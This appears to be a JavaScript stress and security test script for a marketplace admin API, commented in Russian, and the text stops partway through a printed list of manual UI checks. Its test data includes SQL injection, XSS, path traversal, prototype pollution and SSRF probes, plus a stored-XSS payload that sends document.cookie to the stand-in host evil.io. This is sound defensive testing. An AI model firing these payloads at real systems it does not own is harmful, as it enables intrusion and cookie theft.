/**
 * Admin Panel Stress Test — savdo-builder
 * =========================================
 * Запуск:
 *   node analiz/stress-test-admin.js --token=<JWT> [--api=URL] [--product=ID] [--table=products] [--row=ID]
 *   node analiz/stress-test-admin.js --dry          # показать сценарии без выполнения
 *
 * По умолчанию API = https://savdo-api-production.up.railway.app
 * Для dev: --api=http://localhost:3000
 *
 * ВАЖНО: скрипт делает реальные запросы к API. Используй staging или
 *        передай ID тестового товара/записи которые можно трогать.
 *
 * Категории тестов:
 *   [PROD]   — ProductsPage операции (hide/archive/delete/restore)
 *   [DB]     — DatabasePage операции (edit/insert/delete)
 *   [SEARCH] — поиск, пагинация, спецсимволы
 *   [AUTH]   — невалидный токен, истёкший, отсутствующий
 *   [RATE]   — burst запросы, rate limit
 *   [EDGE]   — overflow, unicode, null/empty, injections
 *
 * Добавлено автоматически (то что легко забыть):
 *   - XSS в редактируемых полях (stored XSS probe)
 *   - SQL injection через search/filter параметры
 *   - SSRF через поле URL (если есть)
 *   - Число за пределами Number.MAX_SAFE_INTEGER (BigInt)
 *   - RTL-текст (Arabic/Hebrew) в строковых полях
 *   - Emoji в строках
 *   - Очень длинная строка (10k chars)
 *   - Параллельная пагинация (гонка ответов)
 *   - Двойное подтверждение удаления (UI race simulation)
 *   - Несогласованное состояние: archive уже archived
 *   - 401 mid-session (имитация истечения сессии)
 */

'use strict'

const args = Object.fromEntries(
  process.argv.slice(2).map(a => {
    const [k, ...v] = a.replace(/^--/, '').split('=')
    return [k, v.join('=') || true]
  })
)

const DRY = args.dry === true
const TOKEN = args.token || ''
const API = (args.api || 'https://savdo-api-production.up.railway.app').replace(/\/$/, '')
const TEST_PRODUCT_ID = args.product || null
const TEST_TABLE = args.table || 'products'
const TEST_ROW_ID = args.row || null

// ── Helpers ───────────────────────────────────────────────────────────────────

const c = {
  reset: '\x1b[0m', bold: '\x1b[1m',
  green: '\x1b[32m', red: '\x1b[31m', yellow: '\x1b[33m',
  cyan: '\x1b[36m', gray: '\x1b[90m', magenta: '\x1b[35m',
}

function log(label, msg, color = c.reset) {
  const ts = new Date().toISOString().slice(11, 23)
  console.log(`${c.gray}${ts}${c.reset} ${color}${label}${c.reset} ${msg}`)
}

const pass = (msg) => log('  ✅ PASS', msg, c.green)
const fail = (msg) => log('  ❌ FAIL', msg, c.red)
const warn = (msg) => log('  ⚠️  WARN', msg, c.yellow)
const info = (msg) => log('  ℹ️  INFO', msg, c.cyan)
const skip = (msg) => log('  ⏭️  SKIP', msg, c.gray)

const results = { pass: 0, fail: 0, warn: 0, skip: 0 }

function section(name) {
  console.log(`\n${c.bold}${c.magenta}━━━ ${name} ━━━${c.reset}`)
}

async function req(method, path, body, customToken, label) {
  const url = `${API}${path}`
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${customToken !== undefined ? customToken : TOKEN}`,
  }
  if (!headers['Authorization'].includes(' ')) delete headers['Authorization']

  const start = Date.now()
  try {
    const res = await fetch(url, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined,
      signal: AbortSignal.timeout(10000),
    })
    const ms = Date.now() - start
    let json = null
    try { json = await res.json() } catch { /* empty body */ }
    return { status: res.status, json, ms, ok: res.status < 400 }
  } catch (e) {
    const ms = Date.now() - start
    return { status: 0, json: null, ms, ok: false, err: e.message }
  }
}

// concurrent: запустить N промисов параллельно, вернуть все результаты
async function concurrent(label, n, fn) {
  const promises = Array.from({ length: n }, (_, i) => fn(i))
  return Promise.all(promises)
}

function assert(condition, msg, onFail = 'fail') {
  if (DRY) { skip(msg); results.skip++; return }
  if (condition) { pass(msg); results.pass++ }
  else if (onFail === 'warn') { warn(msg); results.warn++ }
  else { fail(msg); results.fail++ }
}

function dryRun(label, description) {
  if (DRY) { skip(`[DRY] ${label} — ${description}`); results.skip++ }
}

// ── Test runner ───────────────────────────────────────────────────────────────

async function run() {
  if (!TOKEN && !DRY) {
    console.error(`${c.red}❌ Токен не передан. Используй --token=<JWT> или --dry${c.reset}`)
    console.error(`   Получить токен: открой devtools admin-панели → Application → localStorage → savdo_token`)
    process.exit(1)
  }

  console.log(`\n${c.bold}${c.cyan}Admin Stress Test — savdo-builder${c.reset}`)
  console.log(`${c.gray}API: ${API}${c.reset}`)
  console.log(`${c.gray}Mode: ${DRY ? 'DRY RUN (сценарии без запросов)' : 'LIVE'}${c.reset}`)
  console.log(`${c.gray}Prod ID: ${TEST_PRODUCT_ID ?? '⚠️ не передан — продуктовые тесты пропущены'}${c.reset}`)
  console.log(`${c.gray}Row ID: ${TEST_ROW_ID ?? '⚠️ не передан — DB row тесты пропущены'}${c.reset}`)

  // ────────────────────────────────────────────────────────────────────────────
  section('AUTH — невалидные токены')
  // ────────────────────────────────────────────────────────────────────────────

  if (DRY) {
    dryRun('AUTH-01', 'Пустой Authorization → 401')
    dryRun('AUTH-02', 'Сломанный JWT (truncated) → 401')
    dryRun('AUTH-03', 'Expired JWT (заменить exp claim) → 401')
    dryRun('AUTH-04', 'Валидный JWT но role=BUYER → 403')
    dryRun('AUTH-05', 'SQL injection в Bearer значении → 401, не 500')
    dryRun('AUTH-06', 'Bearer <пустая строка> → 401')
  } else {
    const r1 = await req('GET', '/api/v1/admin/products', null, '', 'AUTH-01')
    assert(r1.status === 401, `AUTH-01: пустой token → 401 (получили ${r1.status})`)

    const r2 = await req('GET', '/api/v1/admin/products', null, 'not.a.valid.jwt', 'AUTH-02')
    assert(r2.status === 401, `AUTH-02: сломанный JWT → 401 (получили ${r2.status})`)

    // Expired token — сформируем вручную (подменим payload но подпись уже невалидна)
    const expiredPayload = Buffer.from(JSON.stringify({ sub: 'test', exp: 1000000000 })).toString('base64')
    const fakeJwt = `eyJhbGciOiJIUzI1NiJ9.${expiredPayload}.invalidsig`
    const r3 = await req('GET', '/api/v1/admin/products', null, fakeJwt, 'AUTH-03')
    assert(r3.status === 401, `AUTH-03: expired fake JWT → 401 (получили ${r3.status})`)

    const r4 = await req('GET', '/api/v1/admin/products', null, "'; DROP TABLE users; --", 'AUTH-05')
    assert([400, 401].includes(r4.status), `AUTH-05: SQL inject в token → 400/401, не 500 (получили ${r4.status})`)
    assert(r4.status !== 500, `AUTH-05: сервер не упал (500) при SQL inject в header`)
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PROD — ProductsPage: базовые операции')
  // ────────────────────────────────────────────────────────────────────────────

  if (!TEST_PRODUCT_ID && !DRY) {
    warn('PROD: TEST_PRODUCT_ID не передан, пропускаю мутирующие тесты')
    warn('      Передай: --product=<UUID> (тестовый товар в DRAFT/HIDDEN статусе)')
  }

  const pid = TEST_PRODUCT_ID

  // Получение списка — всегда доступно
  if (!DRY) {
    const list = await req('GET', '/api/v1/admin/products?limit=50', null, TOKEN, 'PROD-00')
    assert(list.status === 200, `PROD-00: GET /admin/products → 200 (${list.ms}ms)`)
    assert(Array.isArray(list.json?.products), 'PROD-00: ответ содержит products[]')
    assert(typeof list.json?.total === 'number', 'PROD-00: ответ содержит total:number')
    info(`PROD-00: ${list.json?.total} товаров в системе`)
  } else {
    dryRun('PROD-00', 'GET /admin/products?limit=50 → 200, {products[], total}')
  }

  // includeDeleted — разница должна быть
  if (!DRY) {
    const withDel = await req('GET', '/api/v1/admin/products?limit=50&includeDeleted=true', null, TOKEN)
    const withoutDel = await req('GET', '/api/v1/admin/products?limit=50', null, TOKEN)
    if (withDel.ok && withoutDel.ok) {
      const diff = (withDel.json?.total ?? 0) - (withoutDel.json?.total ?? 0)
      assert(diff >= 0, `PROD-01: includeDeleted=true total (${withDel.json?.total}) >= без удалённых (${withoutDel.json?.total})`)
      info(`PROD-01: ${diff} удалённых записей в базе`)
    }
  } else {
    dryRun('PROD-01', 'includeDeleted=true должен давать total >= без флага')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PROD — Concurrency: double-hide (race condition)')
  // ────────────────────────────────────────────────────────────────────────────

  if (pid && !DRY) {
    // Сначала убеждаемся что товар в ACTIVE статусе (восстанавливаем)
    await req('PATCH', `/api/v1/admin/products/${pid}/restore`, {}, TOKEN)

    // Два параллельных запроса hide
    const hides = await concurrent('PROD-10', 2, () =>
      req('PATCH', `/api/v1/admin/products/${pid}/hide`, {}, TOKEN)
    )
    const codes = hides.map(r => r.status)
    const allOk = codes.every(c => c === 200 || c === 204 || c === 409)
    assert(allOk, `PROD-10: 2× hide concurrent → все 200/204/409, не 500 (коды: ${codes.join(', ')})`)
    const has200 = codes.some(c => c === 200 || c === 204)
    assert(has200, 'PROD-10: хотя бы один hide вернул 200/204 (действие выполнено)')
    info(`PROD-10: коды ответов: ${codes.join(', ')}, timing: ${hides.map(r => r.ms + 'ms').join(', ')}`)

    // Идемпотентность — третий hide поверх уже hidden
    await new Promise(r => setTimeout(r, 200))
    const hide3 = await req('PATCH', `/api/v1/admin/products/${pid}/hide`, {}, TOKEN)
    assert(
      [200, 204, 409].includes(hide3.status),
      `PROD-11: hide уже hidden товара → 200/204/409 (получили ${hide3.status})`
    )
    assert(hide3.status !== 500, 'PROD-11: сервер не упал при hide уже hidden')
  } else {
    dryRun('PROD-10', '2× hide concurrent — оба 200/204/409, не 500')
    dryRun('PROD-11', 'hide уже hidden → 200/204/409 (idempotency)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PROD — Concurrency: double-archive')
  // ────────────────────────────────────────────────────────────────────────────

  if (pid && !DRY) {
    await req('PATCH', `/api/v1/admin/products/${pid}/restore`, {}, TOKEN)

    const archives = await concurrent('PROD-20', 5, () =>
      req('PATCH', `/api/v1/admin/products/${pid}/archive`, {}, TOKEN)
    )
    const codes = archives.map(r => r.status)
    assert(codes.every(c => [200, 204, 409].includes(c)), `PROD-20: 5× archive concurrent → нет 500 (коды: ${codes.join(', ')})`)
    info(`PROD-20: 5× archive: ${codes.join(', ')} (${archives.map(r => r.ms+'ms').join(', ')})`)

    // State violation: restore → archive → archive снова
    await req('PATCH', `/api/v1/admin/products/${pid}/restore`, {}, TOKEN)
    const arch1 = await req('PATCH', `/api/v1/admin/products/${pid}/archive`, {}, TOKEN)
    assert([200, 204].includes(arch1.status), `PROD-21: archive ACTIVE → 200/204`)
    const arch2 = await req('PATCH', `/api/v1/admin/products/${pid}/archive`, {}, TOKEN)
    assert([200, 204, 409].includes(arch2.status), `PROD-21: archive уже ARCHIVED → 200/204/409 (не 500)`)
  } else {
    dryRun('PROD-20', '5× archive concurrent — нет 500')
    dryRun('PROD-21', 'archive → archive снова → idempotent')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PROD — Delete: race + 404 на второй')
  // ────────────────────────────────────────────────────────────────────────────

  if (pid && !DRY) {
    // Восстанавливаем перед тестом удаления
    await req('PATCH', `/api/v1/admin/products/${pid}/restore`, {}, TOKEN)
    warn(`PROD-30: сейчас удалим товар ${pid} — передай тестовый товар!`)

    const deletes = await concurrent('PROD-30', 2, () =>
      req('DELETE', `/api/v1/admin/products/${pid}`, null, TOKEN)
    )
    const codes = deletes.map(r => r.status)
    const statuses = new Set(codes)
    // Один должен успешно удалить (200/204), другой получить 404 или тоже 200 (soft-delete idempotent)
    assert(
      codes.every(c => [200, 204, 404, 409].includes(c)),
      `PROD-30: 2× delete concurrent → 200/204 + 404 или оба 200 (получили ${codes.join(', ')})`
    )
    assert(!codes.includes(500), 'PROD-30: нет 500 при concurrent delete')
    info(`PROD-30: codes=${codes.join(', ')}`)

    // Третий delete несуществующего
    const del3 = await req('DELETE', `/api/v1/admin/products/${pid}`, null, TOKEN)
    assert([404, 200, 204].includes(del3.status), `PROD-31: delete несуществующего/удалённого → 404 или 200 (soft) (получили ${del3.status})`)
  } else {
    dryRun('PROD-30', '2× delete concurrent → первый 200/204, второй 404 или тоже 200 (soft-delete)')
    dryRun('PROD-31', 'delete уже удалённого → 404 или 200 (soft)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PROD — Restore несуществующего + state violations')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    const fakeId = '00000000-0000-0000-0000-000000000000'
    const r = await req('PATCH', `/api/v1/admin/products/${fakeId}/restore`, {}, TOKEN)
    assert(r.status === 404, `PROD-40: restore несуществующего ID → 404 (получили ${r.status})`)
    assert(r.status !== 500, 'PROD-40: нет 500 для несуществующего ID')
  } else {
    dryRun('PROD-40', 'restore несуществующего UUID → 404, не 500')
    dryRun('PROD-41', 'hide DRAFT товара → 200 или 409 (зависит от state machine)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('DB — DatabasePage: tables metadata')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    const tables = await req('GET', '/api/v1/admin/db/tables', null, TOKEN)
    assert(tables.status === 200, `DB-00: GET /admin/db/tables → 200 (${tables.ms}ms)`)
    assert(Array.isArray(tables.json), 'DB-00: ответ — массив')
    const tnames = tables.json?.map(t => t.table) ?? []
    info(`DB-00: таблицы: ${tnames.join(', ')}`)
    assert(tnames.length > 0, 'DB-00: хотя бы одна таблица в whitelist')
    assert(tnames.length <= 15, `DB-00: whitelist разумен (≤15 таблиц, сейчас ${tnames.length})`)
  } else {
    dryRun('DB-00', 'GET /admin/db/tables → 200, массив с table/count/readonly/writableFields')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('DB — Row: concurrent edit same row (last-write-wins)')
  // ────────────────────────────────────────────────────────────────────────────

  if (TEST_ROW_ID && !DRY) {
    const edits = await concurrent('DB-10', 3, (i) =>
      req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
        { title: `Stress test edit #${i} ${Date.now()}` }, TOKEN)
    )
    const codes = edits.map(r => r.status)
    assert(codes.every(c => [200, 204, 400, 409].includes(c)), `DB-10: 3× edit concurrent → нет 500 (коды: ${codes.join(', ')})`)
    info(`DB-10: last-write-wins: ${codes.join(', ')} (${edits.map(r => r.ms+'ms').join(', ')})`)
  } else {
    dryRun('DB-10', '3× PATCH same row concurrent → нет 500, last-write-wins')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('DB — Row: invalid field types')
  // ────────────────────────────────────────────────────────────────────────────

  if (TEST_ROW_ID && !DRY) {
    // Отправить строку в числовое поле
    const r1 = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { basePrice: 'not-a-number' }, TOKEN)
    assert([400, 422].includes(r1.status), `DB-20: string в числовом поле → 400/422 (получили ${r1.status})`)

    // Невалидный JSON в JSON поле (если есть)
    const r2 = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { metadata: 'this is { not json' }, TOKEN)
    assert([200, 204, 400].includes(r2.status), `DB-21: невалидный JSON → 400 или 200 (бэк принял строку) (получили ${r2.status})`)
    if (r2.status === 200 || r2.status === 204) warn('DB-21: бэк принял невалидный JSON как строку — проверить тип поля')

    // Невалидный enum
    const r3 = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { status: 'NOT_A_REAL_STATUS' }, TOKEN)
    assert([400, 422].includes(r3.status), `DB-22: невалидный enum → 400/422 (получили ${r3.status})`)
    assert(r3.status !== 500, 'DB-22: нет Prisma crash при невалидном enum')
  } else {
    dryRun('DB-20', 'string в числовом поле → 400/422')
    dryRun('DB-21', 'невалидный JSON в JSON поле → 400 или корректно как строка')
    dryRun('DB-22', 'невалидный enum value → 400/422, не 500 (Prisma)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('DB — Row: delete FK-referenced')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    // Попытка удалить FK-referenced запись (например user который есть в orders)
    // Используем несуществующий ID чтобы не разрушить данные
    const fakeId = '00000000-0000-0000-0000-000000000000'
    const r = await req('DELETE', `/api/v1/admin/db/tables/${TEST_TABLE}/${fakeId}`, null, TOKEN)
    assert([404, 409].includes(r.status), `DB-30: delete несуществующего → 404/409 (получили ${r.status})`)
    assert(r.status !== 500, 'DB-30: нет 500 для несуществующего row ID')
  } else {
    dryRun('DB-30', 'delete несуществующего row ID → 404, не 500')
    dryRun('DB-31', 'delete FK-referenced row → 409 (FK violation), не 500 (Prisma P2003)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('DB — Row: concurrent delete')
  // ────────────────────────────────────────────────────────────────────────────

  if (TEST_ROW_ID && !DRY) {
    warn(`DB-40: тест concurrent delete пропущен — требует throwaway row ID (передай отдельно)`)
    skip('DB-40: concurrent delete — нужен отдельный --delete-row=ID')
  } else {
    dryRun('DB-40', '2× delete same row concurrent → первый 200, второй 404, нет 500')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('SEARCH — поисковые запросы и инъекции')
  // ────────────────────────────────────────────────────────────────────────────

  const searchPayloads = [
    ["SEARCH-01", "SQL injection",          "'; DROP TABLE users; --"],
    ["SEARCH-02", "SQL UNION inject",        "' UNION SELECT * FROM users --"],
    ["SEARCH-03", "XSS в search",           "<script>alert(1)</script>"],
    ["SEARCH-04", "XSS iframe",             '<img src=x onerror=alert(1)>'],
    ["SEARCH-05", "SQL wildcard flood",      "%".repeat(1000)],
    ["SEARCH-06", "Null byte",              "prod\x00uct"],
    ["SEARCH-07", "Unicode zero-width",     "pro​duct"],
    ["SEARCH-08", "RTL text",               "منتج عربي"],
    ["SEARCH-09", "Emoji",                  "🛍️🔥💥"],
    ["SEARCH-10", "Very long (10k chars)",  "a".repeat(10000)],
    ["SEARCH-11", "Newline in query",       "foo\nbar\rbaz"],
    ["SEARCH-12", "Path traversal",         "../../etc/passwd"],
    ["SEARCH-13", "Template literal",       "${7*7}"],
    ["SEARCH-14", "LIKE wildcard _",        "_______________"],
  ]

  for (const [id, label, q] of searchPayloads) {
    if (DRY) {
      dryRun(id, `${label} → 200/400, не 500, нет утечки данных`)
      continue
    }
    const encoded = encodeURIComponent(q)
    const r = await req('GET', `/api/v1/admin/products?search=${encoded}&limit=10`, null, TOKEN)
    if (r.status === 500) {
      fail(`${id}: ${label} (${q.slice(0, 30)}) → 500! КРИТИЧНО`)
    } else if ([200, 400].includes(r.status)) {
      pass(`${id}: ${label} → ${r.status} (${r.ms}ms)`)
    } else {
      warn(`${id}: ${label} → ${r.status} (неожиданный, но не 500)`)
    }
  }

  // Также для DB search
  if (!DRY) {
    const rDbSearch = await req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?search=%27+UNION+SELECT+1--&limit=10`, null, TOKEN)
    assert([200, 400].includes(rDbSearch.status), `SEARCH-15: SQL inject в DB search → 200/400 не 500 (${rDbSearch.status})`)
  } else {
    dryRun('SEARCH-15', "SQL inject в DB search → 200 (Prisma parameterized) или 400")
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('EDGE — числа и граничные значения')
  // ────────────────────────────────────────────────────────────────────────────

  if (TEST_ROW_ID && !DRY) {
    // BigInt overflow
    const bigint = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { basePrice: Number.MAX_SAFE_INTEGER + 1 }, TOKEN)
    assert([200, 204, 400, 422].includes(bigint.status), `EDGE-01: BigInt price → нет 500 (${bigint.status})`)
    if (bigint.status === 500) fail('EDGE-01: BigInt вызвал 500! — Prisma BigInt сериализация сломана')

    // Отрицательная цена
    const neg = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { basePrice: -1 }, TOKEN)
    assert([200, 204, 400, 422].includes(neg.status), `EDGE-02: отрицательная цена → нет 500 (${neg.status})`)

    // NaN
    const nan = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { basePrice: NaN }, TOKEN) // JSON.stringify(NaN) === 'null'
    assert([200, 204, 400].includes(nan.status), `EDGE-03: NaN price (→ null) → нет 500 (${nan.status})`)

    // Infinity
    const inf = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { basePrice: Infinity }, TOKEN)
    assert([200, 204, 400].includes(inf.status), `EDGE-04: Infinity price (→ null) → нет 500 (${inf.status})`)

    // XSS в text поле (stored XSS probe)
    const xss = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/${TEST_ROW_ID}`,
      { title: '<img src=x onerror=fetch(`//evil.io/${document.cookie}`)>' }, TOKEN)
    assert([200, 204, 400].includes(xss.status), `EDGE-05: XSS в text поле → нет 500 (${xss.status})`)
    if (xss.ok) warn('EDGE-05: XSS string сохранился в DB — проверить что admin/TMA escapes при рендере!')
  } else {
    dryRun('EDGE-01', 'basePrice = Number.MAX_SAFE_INTEGER + 1 → нет 500 (BigInt Prisma)')
    dryRun('EDGE-02', 'basePrice = -1 → 400 или 200 (зависит от validation)')
    dryRun('EDGE-03', 'basePrice = NaN (→ null в JSON) → нет 500')
    dryRun('EDGE-04', 'basePrice = Infinity (→ null в JSON) → нет 500')
    dryRun('EDGE-05', 'XSS в title поле — сохраняется (stored XSS) + warn что надо escaping при рендере')
    dryRun('EDGE-06', 'RTL text в title (арабский) → нет 500, рендерится корректно')
    dryRun('EDGE-07', 'Emoji в title → нет 500, UTF-8 корректно')
    dryRun('EDGE-08', 'title = null (explicit null) → 400 или 200 (nullable)')
    dryRun('EDGE-09', 'title = "" (пустая строка) → 400 или 200')
    dryRun('EDGE-10', 'title = 10000 символов → 400 (max length) или truncate')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('PAGINATION — гонка запросов при смене страницы')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    // Симуляция: пользователь быстро кликает по страницам 1, 5, 2, 10
    const pages = [1, 5, 2, 10]
    const pageResults = await Promise.all(
      pages.map(p => req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?page=${p}&limit=25`, null, TOKEN))
    )
    const allOk = pageResults.every(r => r.status === 200 || r.status === 404)
    assert(allOk, `PAG-01: быстрое переключение страниц [${pages.join(',')}] → нет 500`)
    info(`PAG-01: страницы [${pages.join(',')}] → статусы: ${pageResults.map(r => r.status).join(', ')} (${pageResults.map(r => r.ms+'ms').join(', ')})`)

    // Несуществующая страница (page=9999)
    const r = await req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?page=9999&limit=25`, null, TOKEN)
    assert([200, 400].includes(r.status), `PAG-02: page=9999 → 200 (пустой массив) или 400 (${r.status})`)
    if (r.status === 200) assert(Array.isArray(r.json?.rows), 'PAG-02: rows[] пустой массив для несуществующей страницы')

    // page=0 и page=-1
    const r0 = await req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?page=0&limit=25`, null, TOKEN)
    assert([200, 400].includes(r0.status), `PAG-03: page=0 → 200 или 400 (${r0.status})`)
    const rNeg = await req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?page=-1&limit=25`, null, TOKEN)
    assert([200, 400].includes(rNeg.status), `PAG-04: page=-1 → 200 или 400 (${rNeg.status})`)

    // limit=10000 — DoS probe
    const rBig = await req('GET', `/api/v1/admin/db/tables/${TEST_TABLE}?page=1&limit=10000`, null, TOKEN)
    assert([200, 400].includes(rBig.status), `PAG-05: limit=10000 → нет 500 (${rBig.status}, ${rBig.ms}ms)`)
    if (rBig.ms > 5000) warn('PAG-05: limit=10000 ответил за >5s — возможна DoS уязвимость')
    const rowCount = rBig.json?.rows?.length ?? 0
    if (rBig.status === 200 && rowCount > 500) warn(`PAG-05: вернул ${rowCount} строк — нет cap на limit!`)
  } else {
    dryRun('PAG-01', 'Rapid page switching [1,5,2,10] concurrent → нет 500, нет race data mixup')
    dryRun('PAG-02', 'page=9999 → 200 empty array или 400')
    dryRun('PAG-03', 'page=0 → 200 или 400')
    dryRun('PAG-04', 'page=-1 → 200 или 400')
    dryRun('PAG-05', 'limit=10000 → нет 500, нет DoS (ответ <5s, count ≤ cap)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('RATE — burst запросы')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    info('RATE-01: 30 параллельных GET /admin/products...')
    const burst = await concurrent('RATE-01', 30, () =>
      req('GET', '/api/v1/admin/products?limit=10', null, TOKEN)
    )
    const codes = burst.map(r => r.status)
    const ok = codes.filter(c => c === 200).length
    const limited = codes.filter(c => c === 429).length
    const errors = codes.filter(c => c === 500).length
    assert(errors === 0, `RATE-01: 30 concurrent GET → нет 500 (ok=${ok}, 429=${limited}, err=${errors})`)
    assert(ok + limited === 30, `RATE-01: все ответы либо 200 либо 429 (ok=${ok}, limited=${limited})`)
    const maxMs = Math.max(...burst.map(r => r.ms))
    const avgMs = Math.round(burst.reduce((s, r) => s + r.ms, 0) / burst.length)
    info(`RATE-01: avg=${avgMs}ms, max=${maxMs}ms`)
    if (maxMs > 10000) warn('RATE-01: max latency >10s под нагрузкой — bottleneck')

    // 10 параллельных мутирующих запросов (если есть токен)
    info('RATE-02: 10 параллельных PATCH (hide/unhide) на один товар...')
    if (pid) {
      const mutBurst = await concurrent('RATE-02', 10, (i) =>
        i % 2 === 0
          ? req('PATCH', `/api/v1/admin/products/${pid}/hide`, {}, TOKEN)
          : req('PATCH', `/api/v1/admin/products/${pid}/restore`, {}, TOKEN)
      )
      const mutCodes = mutBurst.map(r => r.status)
      const mutErr = mutCodes.filter(c => c === 500).length
      assert(mutErr === 0, `RATE-02: 10 concurrent hide/restore → нет 500 (коды: ${mutCodes.join(', ')})`)
    } else {
      skip('RATE-02: нет TEST_PRODUCT_ID')
    }
  } else {
    dryRun('RATE-01', '30 concurrent GET → нет 500, rate limit 429 или все 200, avg <2s')
    dryRun('RATE-02', '10 concurrent hide/restore alternate → нет 500, финальный статус консистентен')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('EDGE — payload атаки на тело запроса')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    // Пустое тело
    const empty = await req('PATCH', `/api/v1/admin/products/00000000-0000-0000-0000-000000000000/hide`, null, TOKEN)
    assert([200, 204, 404, 400].includes(empty.status), `EDGE-20: PATCH с null body → нет 500 (${empty.status})`)

    // Полностью невалидный JSON в теле
    const badJson = await fetch(`${API}/api/v1/admin/products/00000000-0000-0000-0000-000000000000/hide`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${TOKEN}` },
      body: '{ bad json !!!',
      signal: AbortSignal.timeout(5000),
    }).catch(() => ({ status: 0 }))
    assert([400, 404, 200].includes(badJson.status ?? 400), `EDGE-21: невалидный JSON body → нет 500 (${badJson.status})`)

    // Очень большое тело (10MB)
    const bigPayload = { title: 'x'.repeat(10 * 1024 * 1024) }
    const big = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/00000000-0000-0000-0000-000000000000`,
      bigPayload, TOKEN)
    assert([400, 413, 404].includes(big.status), `EDGE-22: 10MB payload → 400/413/404 нет 500 (${big.status})`)
    if (big.ms > 5000) warn('EDGE-22: 10MB payload принял >5s — нет content-length проверки?')

    // Вложенный объект (prototype pollution probe)
    const pp = await req('PATCH', `/api/v1/admin/db/tables/${TEST_TABLE}/00000000-0000-0000-0000-000000000000`,
      { '__proto__': { admin: true }, constructor: { prototype: { admin: true } } }, TOKEN)
    assert([400, 404].includes(pp.status), `EDGE-23: prototype pollution probe → 400/404 нет 500 (${pp.status})`)
  } else {
    dryRun('EDGE-20', 'PATCH с null/empty body → нет 500')
    dryRun('EDGE-21', 'невалидный JSON в Content-Type:json теле → 400, нет 500')
    dryRun('EDGE-22', '10MB payload → 400 или 413 (body size limit), нет 500')
    dryRun('EDGE-23', 'prototype pollution probe → 400/404, нет 500')
    dryRun('EDGE-24', 'SSRF probe: поле url = http://169.254.169.254/metadata → нет 500 или SSRF ответа')
    dryRun('EDGE-25', 'NoSQL-style: { "$where": "1==1" } в body → нет 500 (Prisma не подвержен, но проверить)')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('CONSISTENCY — состояние после операций')
  // ────────────────────────────────────────────────────────────────────────────

  if (!DRY) {
    // GET after concurrent mutations — данные должны быть консистентными
    if (pid) {
      const check = await req('GET', `/api/v1/admin/products?limit=100`, null, TOKEN)
      const product = check.json?.products?.find(p => p.id === pid)
      if (product) {
        info(`CON-01: финальный статус товара ${pid}: ${product.status}`)
        assert(['ACTIVE', 'HIDDEN_BY_ADMIN', 'DRAFT', 'ARCHIVED'].includes(product.status),
          `CON-01: статус товара валидный (${product.status})`)
      } else {
        warn(`CON-01: товар ${pid} не найден в списке (возможно удалён или includeDeleted нужен)`)
      }
    }

    // Audit log должен содержать записи
    const audit = await req('GET', '/api/v1/admin/audit-log?limit=20', null, TOKEN)
    if (audit.status === 200) {
      const logs = audit.json?.logs ?? audit.json?.data ?? audit.json ?? []
      const logCount = Array.isArray(logs) ? logs.length : 0
      info(`CON-02: audit log последние 20 записей — ${logCount} найдено`)
      if (logCount === 0) warn('CON-02: audit log пустой — admin действия не логируются?')
    } else {
      skip(`CON-02: audit log endpoint вернул ${audit.status}`)
    }
  } else {
    dryRun('CON-01', 'Финальный статус товара после всех операций — валидный enum value')
    dryRun('CON-02', 'audit_log содержит записи — все admin действия логируются')
    dryRun('CON-03', 'GET product после concurrent archive/hide показывает финальный консистентный статус')
  }

  // ────────────────────────────────────────────────────────────────────────────
  section('UI — сценарии которые нужно проверить руками / Playwright')
  // ────────────────────────────────────────────────────────────────────────────

  console.log(`
${c.yellow}Следующие сценарии требуют ручной проверки или Playwright:${c.reset}

[UI-01] Double-click на кнопке hide/archive
        Ожидание: кнопка disabled сразу после первого клика (opacity:0.5 + cursor:wait)
        Риск: 2 запроса если кнопка не блокируется немедленно
        Статус: ${pid ? '✅ в ProductsPage есть actionLoading state + opacity:0.5' : '⚠️ проверить вручную'}

[UI-02] Параллельные вкладки браузера
        Откройте 2 вкладки ProductsPage → скройте один товар в Tab A
